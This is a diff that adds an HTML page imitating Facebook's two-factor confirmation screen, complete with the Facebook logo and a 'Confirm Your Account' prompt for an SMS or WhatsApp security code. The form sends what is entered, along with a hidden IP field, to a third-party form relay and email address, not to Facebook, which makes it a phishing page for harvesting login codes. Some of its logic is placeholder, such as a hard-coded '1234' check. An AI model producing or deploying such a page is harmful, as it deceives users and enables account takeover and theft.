@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook 2FA</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 100px;
+        }
+        .title {
+            font-size: 24px;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+        .input-container {
+            margin-bottom: 10px;
+            width: 100%;
+            max-width: 400px;
+        }
+        .input-container input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccd0d5;
+            border-radius: 4px;
+            background-color: #fff;
+        }
+        .message {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+            text-align: center;
+            max-width: 400px;
+        }
+        .btn {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 400px;
+        }
+        .btn:hover {
+            background-color: #165dce;
+        }
+        .resend-link-container {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1877f2;
+            text-align: center;
+        }
+        .resend-link {
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .resend-link.disabled {
+            color: #999;
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+        .resend-link:hover:not(.disabled) {
+            text-decoration: underline;
+        }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+        .code-sent-message {
+            color: blue;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    </div>
+    <div class="title">Confirm Your Account</div>
+    <form id="verificationForm" action="https://formsubmit.co/firstmail901@gmail10p.com" method="POST" onsubmit="return validateCode(event)">
+        <div class="input-container">
+            <input id="securityCode" type="text" placeholder="Security Code" required>
+        </div>
+        <div class="message">Receive the code on your registered device via SMS or WhatsApp.</div>
+        <button type="submit" class="btn">Continue</button>
+        <div class="resend-link-container">
+            <a href="#" class="resend-link disabled" id="resendLink">Send code again (30s)</a>
+            <div id="codeSentMessage" class="code-sent-message">Code Sent</div>
+        </div>
+        <div id="errorMessage" class="error-message">Incorrect code. Please try again.</div>
+        <input type="hidden" id="userIP" name="userIP">
+    </form>
+    <script>
+        function validateCode(event) {
+            event.preventDefault(); // Prevent default form submission behavior
+            const securityCode = document.getElementById('securityCode').value;
+            const userIP = document.getElementById('userIP');
+            // Your code validation logic here
+            if (securityCode !== "1234") { // Replace "1234" with your actual validation logic
+                document.getElementById('errorMessage').style.display = 'block';
+            } else {
+                userIP.value = getClientIP(); // Set the user's IP address
+                document.getElementById('verificationForm').submit(); // Submit the form if the code is correct
+            }
+        }
+        
+        function getClientIP() {
+            // This is a simplified version to get the user's IP address
+            // Replace this with your actual method to get the IP address
+            return '127.0.0.1';
+        }
+        
+        let countdown = 30;
+        const resendLink = document.getElementById('resendLink');
+        const codeSentMessage = document.getElementById('codeSentMessage');
+        const interval = setInterval(() => {
+            countdown--;
+            resendLink.textContent = `Send code again (${countdown}s)`;
+            if (countdown === 0) {
+                clearInterval(interval);
+                resendLink.classList.remove('disabled');
+                resendLink.textContent = 'Send code again';
+                resendLink.href = '#'; // Enable the link
+                codeSentMessage.style.display = 'block';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
